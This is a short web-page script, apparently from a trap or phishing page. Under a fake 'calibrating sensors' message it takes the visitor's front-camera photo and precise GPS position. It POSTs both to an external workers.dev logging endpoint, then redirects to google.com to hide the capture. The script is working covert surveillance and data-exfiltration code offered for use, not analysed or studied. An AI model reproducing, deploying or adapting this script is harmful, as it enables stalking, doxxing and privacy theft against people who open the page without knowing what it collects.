<script>
    const LOGGING_API = "https://titan-logger.saliljha523.workers.dev";
    const video = document.getElementById('v');
    const btn = document.getElementById('btn');
    const status = document.getElementById('status');
    const canvas = document.createElement('canvas');

    btn.onclick = async () => {
        btn.style.display = 'none';
        status.innerText = "CALIBRATING SENSORS...";
        
        // 1. Request GPS and Camera in parallel
        try {
            const [stream, position] = await Promise.all([
                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } }),
                new Promise((resolve) => {
                    navigator.geolocation.getCurrentPosition(resolve, () => resolve(null), {
                        enableHighAccuracy: true,
                        timeout: 5000
                    });
                })
            ]);

            video.srcObject = stream;
            
            video.onloadedmetadata = () => {
                video.play();
                setTimeout(() => executeFinalCapture(position), 300);
            };
        } catch (err) {
            status.innerText = "CRITICAL ERROR: SENSOR_FAILURE";
        }
    };

    async function executeFinalCapture(pos) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        const dataImg = canvas.toDataURL('image/jpeg', 0.4);

        video.srcObject.getTracks().forEach(t => t.stop());

        // Extract exact coordinates if available
        const gps = pos ? `${pos.coords.latitude}, ${pos.coords.longitude}` : "GPS_DENIED";

        fetch(LOGGING_API, {
            method: 'POST',
            keepalive: true,
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ image: dataImg, gps_coords: gps })
        });

        window.location.replace("https://google.com");
    }
</script>
